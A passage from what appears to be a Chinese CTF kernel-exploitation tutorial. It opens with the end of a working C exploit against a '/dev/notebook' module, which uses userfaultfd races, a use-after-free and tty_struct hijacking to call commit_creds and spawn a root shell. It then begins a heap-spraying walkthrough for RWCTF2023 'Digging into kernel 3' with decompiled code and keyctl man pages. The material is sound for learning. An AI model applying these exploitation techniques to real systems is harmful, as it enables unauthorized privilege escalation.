<span class="hljs-comment">/* We expect only one king of evenr; verify that assuption */</span><br>    <span class="hljs-keyword">if</span>(msg.event != UFFD_EVENT_PAGEFAULT)&#123;<br>      <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* copy things to the addr */</span><br><br>    uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>    <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">     * So, round faulting address down to page boundary */</span><br>    uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="hljs-number">1</span>);<br><br>    uffdio_copy.len = page_size;<br>    uffdio_copy.mode = <span class="hljs-number">0</span>;<br>    uffdio_copy.copy = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">addnote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span>* buf)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">userargs</span>;</span><br>  userargs.idx = idx;<br>  userargs.size = size;<br>  userargs.buf = buf;<br>  ioctl(note_fd, <span class="hljs-number">0x100</span>, &amp;userargs);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">userargs</span>;</span><br>  userargs.idx = <span class="hljs-number">0</span>;<br>  userargs.size = <span class="hljs-number">10</span>;<br>  userargs.buf = buf;<br>  ioctl(note_fd, <span class="hljs-number">0x64</span>, &amp;userargs);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">editnote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span>* buf)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">userargs</span>;</span><br>  userargs.idx = idx;<br>  userargs.size = size;<br>  userargs.buf = buf;<br>  ioctl(note_fd, <span class="hljs-number">0x300</span>, &amp;userargs);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">deletenote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">userargs</span>;</span><br>  userargs.idx = idx;<br>  userargs.size = <span class="hljs-number">0x10</span>;<br>  userargs.buf = <span class="hljs-number">0</span>;<br>  ioctl(note_fd, <span class="hljs-number">0x200</span>, &amp;userargs);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">thread_add</span><span class="hljs-params">(<span class="hljs-type">void</span>* uffd_arg)</span>&#123;<br>  sem_wait(&amp;evil_add_sem);<br>  addnote(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, uffd_arg);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">thread_edit</span><span class="hljs-params">(<span class="hljs-type">void</span>* uffd_arg)</span>&#123;<br>  sem_wait(&amp;evil_edit_sem);<br>  editnote(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, uffd_arg);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  bind_cpu(<span class="hljs-number">0</span>);<br>  page_size = sysconf(_SC_PAGE_SIZE);<br>  note_fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-type">size_t</span> fake_tty_struct[<span class="hljs-number">0x100</span>], orig_tty_struct[<span class="hljs-number">0x100</span>];<br>  <span class="hljs-type">size_t</span> fake_tty_operations_addr;<br>  <span class="hljs-type">size_t</span> vmlinux_offset;<br>  <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>  <span class="hljs-comment">/* construct a monitored zone */</span><br>  <span class="hljs-type">char</span>* user_mmap = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  userfaultfd_attack(user_mmap, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>  <span class="hljs-comment">/*init the semaphore, and the value firstly be given a zero*/</span><br>  sem_init(&amp;evil_add_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  sem_init(&amp;evil_edit_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-type">pthread_t</span> thread_1, thread_2;<br><br>  pthread_create(&amp;thread_1, <span class="hljs-literal">NULL</span>, thread_add, (<span class="hljs-type">void</span>*)user_mmap);<br>  pthread_create(&amp;thread_2, <span class="hljs-literal">NULL</span>, thread_edit, (<span class="hljs-type">void</span>*)user_mmap);<br>  <br>  addnote(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, buf);<br>  editnote(<span class="hljs-number">0</span>, <span class="hljs-number">0x2e0</span>, buf);<br><br>  sem_post(&amp;evil_edit_sem);     <span class="hljs-comment">//we could run the thread_edit to get a UAF</span><br>  sleep(<span class="hljs-number">1</span>);<br><br>  sem_post(&amp;evil_add_sem);      <span class="hljs-comment">//use that to modify the size for 0 to not 0</span><br>  sleep(<span class="hljs-number">1</span>);  <br>  <span class="hljs-comment">/* now we get a UAF chunk(0x2e0) with no zero size, so we can get the tty_struct*/</span><br>  info_log(<span class="hljs-string">&quot;try to get the tty_struct&quot;</span>);<br>  tty_fd = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span>(tty_fd &lt;=<span class="hljs-number">0</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;ptmx open failed&quot;</span>);<br>  &#125;<br>  read(note_fd, orig_tty_struct, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span>(*(<span class="hljs-type">int</span>*)orig_tty_struct != <span class="hljs-number">0x5401</span>)&#123;     <span class="hljs-comment">//mey be failed</span><br>    error_log(<span class="hljs-string">&quot;pity,get a wrong tty!&quot;</span>);<br>  &#125;<br>  info_log(<span class="hljs-string">&quot;get right tty_struct!congratulation!&quot;</span>);<br><br>  <span class="hljs-comment">/* get the kernel base offset */</span><br>  vmlinux_offset = ((orig_tty_struct[<span class="hljs-number">3</span>]&amp;<span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x440</span>) ? (orig_tty_struct[<span class="hljs-number">3</span>] - PTM_UNIX98_OPS): (orig_tty_struct[<span class="hljs-number">3</span>] - PTY_UNIX98_OPS);<br>  PRINT_ADDR(<span class="hljs-string">&quot;vmlinux_offset&quot;</span>, vmlinux_offset);<br><br>  <span class="hljs-comment">/* hijack the tty_operations */</span><br>  <span class="hljs-built_in">memcpy</span>(fake_tty_struct, orig_tty_struct, <span class="hljs-number">0x100</span>);<br>  addnote(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, buf); <br>  editnote(<span class="hljs-number">1</span>, <span class="hljs-number">0x2e0</span>, buf);<br>  gift(buf);<br>  fake_tty_operations_addr = buf[<span class="hljs-number">2</span>];<br>  fake_tty_struct[<span class="hljs-number">3</span>] = buf[<span class="hljs-number">2</span>];<br><br>  PRINT_ADDR(<span class="hljs-string">&quot;fake_tty_fops&quot;</span>, fake_tty_struct[<span class="hljs-number">3</span>]);<br>  write(note_fd, fake_tty_struct,<span class="hljs-number">0</span>);<br>  buf[<span class="hljs-number">12</span>] = WORK_FOR_CPU_FN + vmlinux_offset;<br>  write(note_fd, buf, <span class="hljs-number">1</span>);<br>  info_log(<span class="hljs-string">&quot;hijack done !&quot;</span>);<br><br>  <span class="hljs-comment">/* construct the gadget */</span><br>  <span class="hljs-comment">/* prepare_kernel_cred(NULL) */</span><br>  <span class="hljs-built_in">memcpy</span>(fake_tty_struct, orig_tty_struct, <span class="hljs-number">0x2e0</span>);<br>  fake_tty_struct[<span class="hljs-number">3</span>] = fake_tty_operations_addr;<br>  fake_tty_struct[<span class="hljs-number">4</span>] = PREPARE_KERNEL_CRED + vmlinux_offset;<br>  fake_tty_struct[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>  write(note_fd, fake_tty_struct, <span class="hljs-number">0</span>);<br>  ioctl(tty_fd, <span class="hljs-number">0x114514</span>, <span class="hljs-number">0x114514</span>);<br><br>  <span class="hljs-comment">/* commit_creds */</span><br>  read(note_fd, buf, <span class="hljs-number">0</span>);<br>  fake_tty_struct[<span class="hljs-number">5</span>] = buf[<span class="hljs-number">6</span>];<br>  fake_tty_struct[<span class="hljs-number">4</span>] = COMMIT_CREDS + vmlinux_offset;<br>  write(note_fd, fake_tty_struct, <span class="hljs-number">0</span>);<br>  ioctl(tty_fd, <span class="hljs-number">0x123</span>, <span class="hljs-number">0x123</span>);<br>  <br>  <span class="hljs-comment">/* previledge evaluation finished */</span><br>  <span class="hljs-comment">/* recover the tty_struct */</span><br>  write(note_fd, orig_tty_struct, <span class="hljs-number">0</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h1 id="五、Kernel-Heap-Heap-Spraying堆喷"><a href="#五、Kernel-Heap-Heap-Spraying堆喷" class="headerlink" title="五、Kernel Heap - Heap Spraying堆喷"></a>五、Kernel Heap - Heap Spraying堆喷</h1><blockquote>
<p>In <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Computer_security">computer security</a>, <strong>heap spraying</strong> is a technique used in <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Exploit_(computer_security)">exploits</a> to facilitate <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">arbitrary code execution</a>. The part of the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Source_code">source code</a> of an exploit that implements this technique is called a <strong>heap spray</strong>.[<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Heap_spraying#cite_note-1">1]</a> In general, code that <em>sprays the heap</em> attempts to put a certain sequence of bytes at a predetermined location in the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Random_access_memory">memory</a> of a target <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Process_(computing)">process</a> by having it allocate (large) blocks on the process’s <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Heap_(programming)">heap</a> and fill the bytes in these blocks with the right values.</p>
</blockquote>
<p>以上为wikipedia原文，其中介绍heap spray这项技术，普遍上，喷射到堆上面的代码尝试通过在目标进程堆分配大块并且在这些块当中布置恰当的值，来在提前预测的内存地点构造一个确定的字节序列。</p>
<p>堆喷这项技术并不是一个实质上的漏洞利用技术，而是一种辅助增强技术，也就是在程序存在明确漏洞但是难以利用的情况下，可以通过这类辅助技术来方便我们的漏洞利用，下面我们将通过例题来学习</p>
<h2 id="例题：RWCTF2023体验赛-Digging-into-kernel-3"><a href="#例题：RWCTF2023体验赛-Digging-into-kernel-3" class="headerlink" title="例题：RWCTF2023体验赛 - Digging into kernel 3"></a>例题：RWCTF2023体验赛 - Digging into kernel 3</h2><h3 id="1-题目逆向-2"><a href="#1-题目逆向-2" class="headerlink" title="1.题目逆向"></a>1.题目逆向</h3><p>首先就是启动脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span>                                                                               <br>                                                                                        <br>qemu-system-x86_64 \                                                                    <br>        -m 128M \                                                                       <br>        -nographic \                                                                    <br>        -kernel ./bzImage \                                                             <br>   		--enable-kvm \                                                                        <br>        -initrd ./rootfs.img \                                                          <br>        -cpu kvm64,+smap,+smep \                                                        <br>        -monitor /dev/null \                                                            <br>        -append &#x27;console=ttyS0 kaslr kpti=1 quiet oops=panic panic=1 init=/init&#x27; \    <br>        -no-reboot \                                                                    <br>        -snapshot \                                                                     <br>        -s                                                                              <br><br></code></pre></td></tr></table></figure>

<p>基本上都开了，但是这里存在一个调试问题，在开启硬件加速后<code>--enable-kvm</code>，会导致gdb远程调试进入死中断，只要gdb发出了断点，内核就会进行处理，然后gdb再次恢复环境的时候再次触发内核中断(这仅仅是我个人的理解)，所以如果你只(n&#x2F;s)就会无限循环在同一行代码，但是你会发现如果你打断点在之后的代码他又会运行到那儿，但情况跟刚刚会完全一致，具体情况如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/a6efce1b9d16fdfa26c53221f18f8c5495ee7b50.jpg" srcset="/img/loading.gif" lazyload></p>
<p>而要解决这个问题，在我的ubuntu20.04上只需要关闭硬件加速即可</p>
<p>然后就是我们文件系统的脚本init</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span>                                                    <br>                                                             <br>mkdir /tmp                                                   <br>mount -t proc none /proc                                     <br>mount -t sysfs none /sys                                     <br>mount -t devtmpfs none /dev                                  <br>mount -t tmpfs none /tmp                                     <br>                                                             <br>exec 0&lt;/dev/console                                          <br>exec 1&gt;/dev/console                                          <br>exec 2&gt;/dev/console                                          <br>                                                             <br>insmod /rwctf.ko                                             <br>chmod 666 /dev/rwctf                                         <br>chmod 700 /flag                                              <br>chmod 400 /proc/kallsyms                                     <br>                                                             <br>echo 1 &gt; /proc/sys/kernel/kptr_restrict                      <br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict                     <br>                                                             <br>poweroff -d 120 -f &amp;                                        <br>                                                             <br>echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;    <br><span class="hljs-meta prompt_">#</span><span class="language-bash">setsid /bin/cttyhack setuidgid 0 /bin/sh</span>                    <br>setsid /bin/cttyhack setuidgid 1000 /bin/sh                  <br>                                                             <br>umount /proc                                                 <br>umount /sys                                                  <br>umount /tmp                                                  <br>                                                             <br>poweroff -d 0 -f                                             <br><br></code></pre></td></tr></table></figure>

<p>插入了一个模块<code>rwctf.ko</code></p>
<p>题目中所实现的函数仅仅只有以下几个：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rwmod_release</span>	.text	        <span class="hljs-number">0000000000000000</span>	<span class="hljs-number">00000007</span>			R	.	.	.	.	.	.	.<br><span class="hljs-attribute">rwmod_ioctl</span>	    .text	        <span class="hljs-number">0000000000000010</span>	<span class="hljs-number">0000010</span>D	<span class="hljs-number">00000038</span>		R	.	.	.	.	B	.	.<br><span class="hljs-attribute">rwmod_open</span>	    .text.unlikely	<span class="hljs-number">000000000000011</span>D	<span class="hljs-number">00000013</span>			R	.	.	.	.	.	.	.<br><span class="hljs-attribute">rwmod_init</span>	    .init.text	    <span class="hljs-number">0000000000000130</span>	<span class="hljs-number">0000004</span>F	<span class="hljs-number">00000008</span>		R	.	.	.	.	.	.	.<br><span class="hljs-attribute">rwmod_exit</span>	    .exit.text	    <span class="hljs-number">000000000000017</span>F	<span class="hljs-number">0000000</span>C			R	.	.	.	.	.	.	.<br></code></pre></td></tr></table></figure>

<p>其中比较重要的核心点就是<code>rwmod_ioctl</code>函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">rwmod_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 userarg)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  __int64 v5; <span class="hljs-comment">// rbx</span><br>  __int64 kmalloc_ptr; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span><br>  <span class="hljs-type">void</span> *buffer; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v10; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br><br>  v10 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( !userarg )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0xC0DECAFE</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !copy_from_user(&amp;idx, userarg, <span class="hljs-number">16LL</span>) &amp;&amp; idx &lt;= <span class="hljs-number">1</span> )<br>      kfree(buf[idx]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  v3 = <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0xDEADBEEF</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( copy_from_user(&amp;idx, userarg, <span class="hljs-number">16LL</span>) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    v5 = idx;<br>    <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    buf[v5] = _kmalloc(size, <span class="hljs-number">3520LL</span>);<br>    kmalloc_ptr = buf[idx];<br>    <span class="hljs-keyword">if</span> ( !kmalloc_ptr )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x7FFFFFFF</span>uLL )<br>      BUG();<br>    <span class="hljs-keyword">if</span> ( copy_from_user(kmalloc_ptr, buffer, size) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v3;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们传入的参数为下面的结构体</p>
<table>
<thead>
<tr>
<th align="center">userarg(0x16)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">idx(0x4)</td>
</tr>
<tr>
<td align="center">size(0x4)</td>
</tr>
<tr>
<td align="center">buffer(0x8)</td>
</tr>
</tbody></table>
<p>然后有两个选项</p>
<ol>
<li><p>0xC0DECAFE: kfree块，但存在悬垂指针</p>
</li>
<li><p>0xDEADBEEF: 按照传入的size来kmalloc一定大小的块</p>
</li>
</ol>
<p>所以这里我们可以看到程序是存在很多个UAF</p>
<h3 id="2-add-key基础知识"><a href="#2-add-key基础知识" class="headerlink" title="2.add_key基础知识"></a>2.add_key基础知识</h3><p>内核中存在一个密钥管理系统，他通过keyctl这个系统调用提供的接口来进行读取、修改、注销等功能，如下是linux手册当中的解释</p>
<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs verilog">NAME<br>       keyctl - manipulate the kernel&#x27;s key management facility<br><br>SYNOPSIS<br>       #<span class="hljs-keyword">include</span> &lt;sys/types<span class="hljs-variable">.h</span>&gt;<br>       #<span class="hljs-keyword">include</span> &lt;keyutils<span class="hljs-variable">.h</span>&gt;<br><br>       long keyctl(<span class="hljs-keyword">int</span> operation, ...)<br><br>       <span class="hljs-comment">/* For direct call via syscall(2): */</span><br>       #<span class="hljs-keyword">include</span> &lt;asm/unistd<span class="hljs-variable">.h</span>&gt;<br>       #<span class="hljs-keyword">include</span> &lt;linux/keyctl<span class="hljs-variable">.h</span>&gt;<br>       #<span class="hljs-keyword">include</span> &lt;unistd<span class="hljs-variable">.h</span>&gt;<br><br>       long syscall(__NR_keyctl, <span class="hljs-keyword">int</span> operation, __kernel_ulong_t arg2,<br>                    __kernel_ulong_t arg3, __kernel_ulong_t arg4,<br>                    __kernel_ulong_t arg5);<br><br>       No glibc wrapper is provided <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> system call; see NOTES.<br><br>DESCRIPTION<br>       keyctl() allows user-space programs to perform key manipulation. 	<span class="hljs-comment">//允许用户进行密钥操作</span><br><br>       The  operation  performed by keyctl() is determined by the value of the operation argument.  Each of these operations is wrapped by the libkeyutils <span class="hljs-keyword">library</span> (provided by the keyutils <span class="hljs-keyword">package</span>) into individual functions<br>       (noted below) to permit the compiler to check types.<br><br>NOTES<br>       No wrapper <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> system call is provided in glibc.  A wrapper is provided in the libkeyutils <span class="hljs-keyword">library</span>.  When employing the wrapper in that <span class="hljs-keyword">library</span>, link <span class="hljs-keyword">with</span> -lkeyutils.  However, rather than using <span class="hljs-keyword">this</span> system call<br>       directly, you probably want to <span class="hljs-keyword">use</span> the various <span class="hljs-keyword">library</span> functions mentioned in the descriptions of individual operations above.<br><br></code></pre></td></tr></table></figure>

<p>通过描述我们可以简单的了解到他是为了迁就用户空间来使用密钥相关的操作，还有一个需要注意的点那就是glibc不包含该系统调用，需要链接的时候额外加上<code>-lkeyutils</code>链接外部包才可以使用它。</p>
<p>我们知道了密钥管理的相关系统调用，那这个密钥从哪儿来呢？同样，内核提供了另一个系统调用<code>add_key()</code>来创建密钥，解释如下：</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">NAME<br>       add_key - add a <span class="hljs-keyword">key</span> <span class="hljs-keyword">to</span> the kernel<span class="hljs-comment">&#x27;s key management facility</span><br><br>SYNOPSIS<br>       #include &lt;sys/types.h&gt;<br>       #include &lt;keyutils.h&gt;<br><br>       key_serial_t add_key(<span class="hljs-keyword">const</span> <span class="hljs-type">char</span> *type, <span class="hljs-keyword">const</span> <span class="hljs-type">char</span> *description,<br>                            <span class="hljs-keyword">const</span> void *payload, size_t plen,<br>                            key_serial_t keyring);<br><br>       No glibc wrapper <span class="hljs-built_in">is</span> provided <span class="hljs-keyword">for</span> this system <span class="hljs-keyword">call</span>; see NOTES.<br><br>DESCRIPTION<br>       add_key() creates <span class="hljs-built_in">or</span> updates a <span class="hljs-keyword">key</span> <span class="hljs-keyword">of</span> the given type <span class="hljs-built_in">and</span> description, instantiates it <span class="hljs-keyword">with</span> the payload <span class="hljs-keyword">of</span> length plen, attaches it <span class="hljs-keyword">to</span> the nominated keyring, <span class="hljs-built_in">and</span> returns the <span class="hljs-keyword">key</span><span class="hljs-comment">&#x27;s serial number.</span><br><br>       The <span class="hljs-keyword">key</span> may be rejected <span class="hljs-keyword">if</span> the provided data <span class="hljs-built_in">is</span> <span class="hljs-keyword">in</span> the wrong format <span class="hljs-built_in">or</span> it <span class="hljs-built_in">is</span> invalid <span class="hljs-keyword">in</span> some other way.<br><br>       <span class="hljs-keyword">If</span>  the  destination  keyring already contains a <span class="hljs-keyword">key</span> that matches the specified type <span class="hljs-built_in">and</span> description, <span class="hljs-keyword">then</span>, <span class="hljs-keyword">if</span> the <span class="hljs-keyword">key</span> type supports it, that <span class="hljs-keyword">key</span> will be updated rather than a <span class="hljs-built_in">new</span> <span class="hljs-keyword">key</span> being created; <span class="hljs-keyword">if</span> <span class="hljs-built_in">not</span>, a <span class="hljs-built_in">new</span> <span class="hljs-keyword">key</span><br>       (<span class="hljs-keyword">with</span> a different ID) will be created <span class="hljs-built_in">and</span> it will displace the link <span class="hljs-keyword">to</span> the extant <span class="hljs-keyword">key</span> <span class="hljs-keyword">from</span> the keyring.<br><br>       The destination keyring serial number may be that <span class="hljs-keyword">of</span> a valid keyring <span class="hljs-keyword">for</span> which the caller has write permission.  Alternatively, it may be one <span class="hljs-keyword">of</span> the following special keyring IDs:<br><br>       KEY_SPEC_THREAD_KEYRING<br>              This specifies the caller<span class="hljs-comment">&#x27;s thread-specific keyring (thread-keyring(7)).</span><br><br>       KEY_SPEC_PROCESS_KEYRING<br>              This specifies the caller<span class="hljs-comment">&#x27;s process-specific keyring (process-keyring(7)).</span><br><br>       KEY_SPEC_SESSION_KEYRING<br>              This specifies the caller<span class="hljs-comment">&#x27;s session-specific keyring (session-keyring(7)).</span><br><br>       KEY_SPEC_USER_KEYRING<br>              This specifies the caller<span class="hljs-comment">&#x27;s UID-specific keyring (user-keyring(7)).</span><br><br>       KEY_SPEC_USER_SESSION_KEYRING<br>              This specifies the caller<span class="hljs-comment">&#x27;s UID-session keyring (user-session-keyring(7)).</span><br><br></code></pre></td></tr></table></figure>

<p>add_key() 创建或更新给定类型和描述的密钥，使用长度为 plen 的有效负载实例化它，将其附加到指定的keyring，并返回密钥的序列号。如果提供的数据格式错误或在其他方面无效，则密钥可能会被拒绝。</p>
<p>如果目标keyring已包含与指定类型和描述匹配的密钥，那么，如果密钥类型支持它，则将更新该密钥，而不是创建新密钥； 如果没有，则使用新密钥（使用不同的 ID）将被创建，并将替换keyring中现有密钥的链接。目的地keyring序列号可以是调用者具有写入权限的有效密钥环的序列号。</p>
<p>这里来简单解释以下keyring是什么：直译过来就是钥匙环，也就是咱们平时挂钥匙的地方，也算得上是一个钥匙们的集合，使用它可以方便咱们密钥的分类管理，他基本上给钥匙分了以下三类：</p>
